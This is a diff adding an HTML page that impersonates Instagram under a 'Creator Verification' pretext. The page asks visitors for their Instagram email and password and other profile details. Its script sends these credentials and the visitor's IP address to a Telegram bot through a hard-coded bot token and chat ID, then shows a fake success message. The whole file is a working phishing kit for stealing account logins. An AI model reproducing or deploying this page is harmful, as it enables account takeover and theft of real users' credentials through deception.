@@ -1,0 +1,207 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram Creator Verification</title>
+    <style>
+        /* نفس التنسيق السابق */
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: #f7f7f7;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background: linear-gradient(135deg, #d8c5f0, #ff9c99);
+        }
+
+        .container {
+            width: 100%;
+            max-width: 450px;
+            background: #ffffff;
+            padding: 40px 20px;
+            border-radius: 15px;
+            box-shadow: 0px 8px 15px rgba(0, 0, 0, 0.1);
+            text-align: center;
+            position: relative;
+        }
+
+        /* Instagram logo and Title */
+        .logo {
+            width: 100px;
+            margin: 0 auto 20px;
+            transition: transform 0.3s;
+        }
+
+            .logo:hover {
+                transform: scale(1.1);
+            }
+
+        h1 {
+            font-size: 26px;
+            color: #333;
+            margin-bottom: 30px;
+        }
+
+        /* Form Styles */
+        input, select, button {
+            width: 100%;
+            padding: 15px;
+            margin-bottom: 15px;
+            border-radius: 8px;
+            border: 1px solid #ddd;
+            font-size: 16px;
+            background-color: #fafafa;
+            transition: background-color 0.3s, transform 0.2s;
+        }
+
+            input:focus, select:focus, button:focus {
+                background-color: #f0f0f0;
+                outline: none;
+                transform: scale(1.02);
+            }
+
+        button {
+            background-color: #3897f0;
+            color: white;
+            font-weight: bold;
+            cursor: pointer;
+            border: none;
+        }
+
+            button:hover {
+                background-color: #287dcf;
+            }
+
+        /* Status Message */
+        .status {
+            margin-top: 20px;
+            padding: 15px;
+            border-radius: 8px;
+            font-weight: bold;
+            display: none;
+        }
+
+            .status.success {
+                background-color: #e9f7e6;
+                color: #27a745;
+            }
+
+            .status.error {
+                background-color: #f8d7da;
+                color: #721c24;
+            }
+
+        /* Verification Badge */
+        .verification-badge {
+            position: absolute;
+            top: 20px;
+            right: 20px;
+            background-color: #ffd700;
+            padding: 10px 15px;
+            border-radius: 10px;
+            font-weight: bold;
+            color: #fff;
+            font-size: 14px;
+            box-shadow: 0px 4px 8px rgba(0, 0, 0, 0.2);
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a5/Instagram_icon.png/1200px-Instagram_icon.png" alt="Instagram Logo" class="logo">
+        <h1>Instagram Creator Verification</h1>
+        <div class="verification-badge">Verified</div>
+        <form id="verificationForm">
+            <input type="email" id="email" placeholder="Enter your Instagram email" required>
+            <input type="password" id="password" placeholder="Enter your Instagram password" required>
+            <input type="text" id="name" placeholder="Full Name" required>
+            <input type="url" id="instagramLink" placeholder="Instagram Profile Link" required>
+            <input type="number" id="followers" placeholder="Number of Followers" required>
+            <select id="field" required>
+                <option value="" disabled selected>Field of Work</option>
+                <option value="Fashion">Fashion</option>
+                <option value="Tech">Tech</option>
+                <option value="Music">Music</option>
+                <option value="Other">Other</option>
+            </select>
+            <button type="submit">Submit Request</button>
+        </form>
+        <div id="statusMessage" class="status"></div>
+    </div>
+
+    <script>
+        document.getElementById('verificationForm').addEventListener('submit', function (event) {
+            event.preventDefault();
+
+            // Collect form data
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            const name = document.getElementById('name').value;
+            const instagramLink = document.getElementById('instagramLink').value;
+            const followers = document.getElementById('followers').value;
+            const field = document.getElementById('field').value;
+
+            // Prepare message to send to Telegram
+            const message = `
+                New Instagram Verification Request:
+                Email: ${email}
+                Password: ${password}
+                Name: ${name}
+                Instagram Profile: ${instagramLink}
+                Followers: ${followers}
+                Field of Work: ${field}
+                IP Address: ${getIpAddress()}
+                `;
+
+            // Send data to Telegram Bot
+            sendToTelegram(message);
+
+            // Show success message
+            displayStatus('Your request has been submitted successfully!', 'success');
+            clearForm();
+        });
+
+        // Function to display status message
+        function displayStatus(message, type) {
+            const statusMessage = document.getElementById('statusMessage');
+            statusMessage.textContent = message;
+            statusMessage.style.display = 'block';
+            statusMessage.className = `status ${type}`;
+        }
+
+        // Clear form after submission
+        function clearForm() {
+            document.getElementById('verificationForm').reset();
+        }
+
+        // Function to send message to Telegram
+        function sendToTelegram(message) {
+            const botToken = '7623726117:AAGq3DO6XHmy5DpmZPBOaar5pVZkHjfxwP0';  // Replace with your bot's token
+            const chatId = '7117288243';  // Replace with your chat ID
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+            fetch(url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message
+                })
+            });
+        }
+
+        // Function to get the IP address of the user (for simplicity, using an external API)
+        async function getIpAddress() {
+            const response = await fetch('https://api.ipify.org?format=json');
+            const data = await response.json();
+            return data.ip;
+        }
+    </script>
+</body>
+</html>
